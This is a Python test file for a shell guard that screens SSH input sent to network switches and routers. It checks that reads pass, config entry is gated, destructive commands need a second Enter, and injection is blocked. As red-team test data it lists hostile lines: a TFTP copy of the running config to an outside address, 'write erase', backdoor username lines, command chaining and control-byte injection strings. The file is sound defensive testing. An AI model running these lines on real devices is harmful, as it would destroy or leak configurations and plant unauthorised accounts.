"""Shell Guard tests — the human shell is live, but still audited.

The invariant under test: config reaches the device without an automation
approval gate, while destructive, credential, and ambiguous input still fails
closed or requires confirmation.
"""

from netcode.shell_guard import (
    KILL_LINE,
    GuardDecision,
    ShellSessionState,
    classify_line,
    feed,
    guard_submit,
    looks_like_paste,
    submit_line,
)


def type_line(state: ShellSessionState, line: str) -> GuardDecision:
    """Simulate interactive typing: chars then Enter, in one chunk (still not
    a paste — pastes need 2+ newlines)."""
    return feed(state, line + "\r")


# ---------------------------------------------------------------- classify

def test_classify_config_enter_covers_abbreviations():
    for spelling in ("configure terminal", "conf t", "config", "configure session x", "edit"):
        assert classify_line(spelling, in_config=False)["kind"] == "config_enter", spelling


def test_classify_normal_commands_flow_like_ssh():
    """Allow-by-default: ordinary exec/read commands and vendor abbreviations
    just work (this is a real SSH terminal, not a straitjacket)."""
    for line in ("show vlan brief", "show run | sec vlan", "sh ip int br", "en", "enable",
                 "disable", "terminal length 0", "ping 10.0.0.1", "traceroute 10.0.0.1",
                 "show tech-support", "who", "bash-completion", "monitor session"):
        assert classify_line(line, in_config=False)["kind"] == "read", line


def test_classify_gated_and_destructive_commands():
    """The only things that don't flow: config-mode entry, destructive exec,
    shell escapes, credentials, chaining."""
    for line in ("configure terminal", "conf t", "config-transaction", "configuration", "edit"):
        assert classify_line(line, in_config=False)["kind"] == "config_enter", line
    for line in ("do reload", "clear ip bgp *", "copy running-config tftp://h/x",
                 "write memory", "wr", "delete flash:x", "reload now", "bash", "python3", "tclsh"):
        assert classify_line(line, in_config=False)["kind"] == "dangerous", line


def test_classify_credential_lines_always_blocked_even_in_config():
    for line in ("username evil secret x", "aaa new-model", "snmp-server community public"):
        assert classify_line(line, in_config=True)["kind"] == "always_blocked", line


def test_classify_dangerous_context():
    assert classify_line("reload", in_config=False)["kind"] == "dangerous"
    assert classify_line("write erase", in_config=False)["kind"] == "dangerous"
    # 'shutdown' is only destructive inside config; a bare exec 'shutdown' flows.
    assert classify_line("shutdown", in_config=False)["kind"] == "read"
    assert classify_line("shutdown", in_config=True)["kind"] == "dangerous"
    assert classify_line("no vlan 90", in_config=True)["kind"] == "dangerous"


def test_classify_do_prefix_and_chaining_and_whitespace():
    # 'do <exec>' runs an exec command from anywhere -> judged as that exec.
    assert classify_line("do reload", in_config=False)["kind"] == "dangerous"
    assert classify_line("do show run", in_config=True)["kind"] == "read"  # do <read> flows
    # command chaining can't smuggle a second command past first-token checks.
    assert classify_line("show clock ; reload", in_config=False)["kind"] == "blocked_chain"
    assert classify_line("show version && configure terminal", in_config=False)["kind"] == "blocked_chain"
    # whitespace-collapse: double space / tab can't dodge the credential floor.
    assert classify_line("enable  secret cisco", in_config=True)["kind"] == "always_blocked"
    assert classify_line("username\tadmin secret x", in_config=True)["kind"] == "always_blocked"
    # config-mode entry variants (incl. abbreviations) are gated, not run.
    assert classify_line("config-transaction", in_config=False)["kind"] == "config_enter"


# ---------------------------------------------------------------- the gate

def test_read_only_session_forwards_show_commands():
    state = ShellSessionState()
    decision = type_line(state, "show vlan brief")
    assert decision.forward == "show vlan brief\r"
    assert decision.events == []
    assert state.device_touched is False


def test_default_session_allows_config_mode_live():
    state = ShellSessionState()
    decision = type_line(state, "conf t")
    assert decision.forward.endswith("\r")
    actions = [e.get("action") for e in decision.events]
    assert "config_mode_entered_live" in actions
    assert state.in_config is True
    assert state.device_touched is True


def test_change_attached_session_allows_config_mode_and_earns_touched():
    state = ShellSessionState(mode="change_attached", change_id="CHG-1")
    decision = type_line(state, "configure terminal")
    assert decision.forward.endswith("\r")
    assert state.in_config is True
    assert state.device_touched is True
    exit_decision = type_line(state, "end")
    assert exit_decision.forward.endswith("\r")
    assert state.in_config is False


def test_credential_lines_blocked_even_with_change_attached():
    state = ShellSessionState(mode="change_attached", change_id="CHG-1", in_config=True)
    decision = type_line(state, "username hacker secret pw")
    assert decision.forward.endswith(KILL_LINE)
    assert any(e.get("action") == "blocked_credential_line" for e in decision.events)
    # blocked lines never earn device_touched on their own
    assert state.pending_confirm is None


def test_dangerous_requires_double_enter():
    state = ShellSessionState(mode="change_attached", change_id="CHG-1")
    first = type_line(state, "reload")
    assert "\r" not in first.forward  # swallowed, not sent
    assert any(e.get("action") == "dangerous_needs_confirm" for e in first.events)
    second = feed(state, "\r")  # bare Enter confirms the same buffered line
    assert second.forward == "\r"
    assert any(e.get("action") == "dangerous_confirmed" for e in second.events)


def test_ctrl_c_cancels_dangerous_confirmation():
    state = ShellSessionState(mode="change_attached", change_id="CHG-1")
    type_line(state, "reload")
    assert state.pending_confirm is not None
    feed(state, "\x03")
    assert state.pending_confirm is None
    assert state.line_buffer == ""


def test_history_recall_taints_and_blocks_fail_closed():
    state = ShellSessionState()  # read_only
    # up-arrow (ESC [ A) recalls some previous command the buffer can't see
    decision = feed(state, "\x1b[A\r")
    assert decision.forward.startswith("\x1b[A")  # arrows pass through for echo
    assert decision.forward.endswith(KILL_LINE)   # but the Enter is gated
    assert any(e.get("action") == "blocked_unverifiable_line" for e in decision.events)
    # after the block the buffer is clean again: normal reads work
    ok = type_line(state, "show version")
    assert ok.forward == "show version\r"


def test_backspace_editing_stays_verifiable():
    state = ShellSessionState()
    decision = feed(state, "shoq\x7fw ver\r")  # typo, backspace, continue
    assert decision.forward.endswith("\r")
    assert not any(e.get("action") == "blocked_unverifiable_line" for e in decision.events)


# ---------------------------------------------------------------- pastes

def test_config_paste_is_intercepted_whole_in_read_only():
    state = ShellSessionState()
    chunk = "vlan 90\n   name GUEST_WIFI\ninterface vlan 90\n"
    decision = feed(state, chunk)
    assert decision.forward == ""  # not one byte reached the device
    events = [e for e in decision.events if e.get("action") == "paste_intercepted"]
    assert events and events[0]["line_count"] == 3
    assert "stage_as_change" in events[0]["options"]
    assert state.device_touched is False


def test_show_command_paste_passes_through():
    state = ShellSessionState()
    chunk = "show vlan brief\nshow ip route\nshow version\n"
    decision = feed(state, chunk)
    assert "show ip route" in decision.forward
    assert not any(e.get("action") == "paste_intercepted" for e in decision.events)


def test_paste_detection_thresholds():
    assert looks_like_paste("show ver\nshow vlan\n") is True
    assert looks_like_paste("show ver\r") is False


# -------------------------------------------------- REST taint/injection gap

def test_rest_backspace_injection_cannot_smuggle_config_enter():
    """The classic injection: classify as a read, but backspaces edit the line
    on the device into 'conf t'. Must be fail-closed on control bytes."""
    state = ShellSessionState()  # read_only
    d = guard_submit(state, "show ver\x08\x08\x08\x08\x08\x08\x08\x08conf t")
    assert d["kind"] == "blocked"
    assert any(e["action"] == "blocked_unverifiable_line" for e in d["events"])
    assert state.in_config is False


def test_rest_kill_line_and_escape_are_blocked():
    for hostile in ("show ver\x15conf t", "show ver\x1b[Dconf t", "conf\tt"[:0] + "sh\x1bver"):
        state = ShellSessionState()
        d = guard_submit(state, hostile)
        assert d["kind"] == "blocked", hostile


def test_rest_embedded_newline_credential_is_not_smuggled_past_a_read():
    """'show version\\nusername evil ...' must never be forwarded as one read."""
    state = ShellSessionState(mode="change_attached", change_id="CHG-1")
    d = guard_submit(state, "show version\nusername evil secret x")
    assert d["kind"] in ("blocked", "paste_intercept")  # never run_reads
    assert d["kind"] != "run_reads"


def test_rest_multiline_all_reads_runs_each_line():
    state = ShellSessionState()
    d = guard_submit(state, "show version\nshow vlan brief\nshow ip route")
    assert d["kind"] == "run_reads"
    assert d["lines"] == ["show version", "show vlan brief", "show ip route"]


def test_rest_multiline_mixing_read_and_nonread_blocks():
    state = ShellSessionState()
    d = guard_submit(state, "show version\nreload")
    assert d["kind"] == "blocked"
    assert any(e["action"] in ("blocked_mixed_multiline", "paste_intercepted") for e in d["events"]) or d["kind"] == "blocked"


def test_rest_single_read_runs():
    state = ShellSessionState()
    d = guard_submit(state, "show vlan brief")
    assert d["kind"] == "run_reads" and d["lines"] == ["show vlan brief"]


def test_rest_config_enter_runs_live_via_guard_submit():
    read_only = ShellSessionState()
    assert guard_submit(read_only, "conf t")["kind"] == "run_live"
    attached = ShellSessionState(mode="change_attached", change_id="CHG-1")
    assert guard_submit(attached, "conf t")["kind"] == "run_live"


def test_rest_config_block_runs_live_in_one_session():
    state = ShellSessionState()
    decision = guard_submit(state, "configure terminal\ninterface Loopback999\ndescription NETCODE_TEST\nend")
    assert decision["kind"] == "run_live"
    assert decision["lines"] == ["configure terminal", "interface Loopback999", "description NETCODE_TEST", "end"]
    assert state.in_config is False
    assert state.device_touched is True


def test_submit_line_rejects_control_bytes_directly():
    state = ShellSessionState()
    assert submit_line(state, "show ver\x08\x08x")["cleared"] is False


def test_redteam_criticals_are_blocked_at_guard_submit():
    """The confirmed red-team bypasses, at the REST shell input entry point.
    Config is live now; destructive/credential/chaining still cannot execute as
    ordinary reads."""
    criticals = [
        "do reload", "do write erase",
        "clear ip bgp *", "clear logging",
        "copy running-config tftp://198.51.100.9/rc",
        "write memory", "wr",
        "show clock ; reload", "show version && configure terminal",
        "tclsh", "bash", "python",
    ]
    for cmd in criticals:
        state = ShellSessionState()  # read-only
        decision = guard_submit(state, cmd)
        # Not cleared to run on first submit: either blocked (config/chain) or
        # held for a confirm (destructive/shell-escape). Never run_reads.
        assert decision["kind"] != "run_reads", f"{cmd!r} -> {decision['kind']} (must NOT run)"
        assert state.in_config is False and state.device_touched is False, cmd


def test_redteam_multiline_destructive_paste_blocked():
    state = ShellSessionState()
    assert guard_submit(state, "show clock\nclear logging")["kind"] == "blocked"
    assert guard_submit(ShellSessionState(), "terminal length 0\nreload")["kind"] in ("blocked", "paste_intercept")
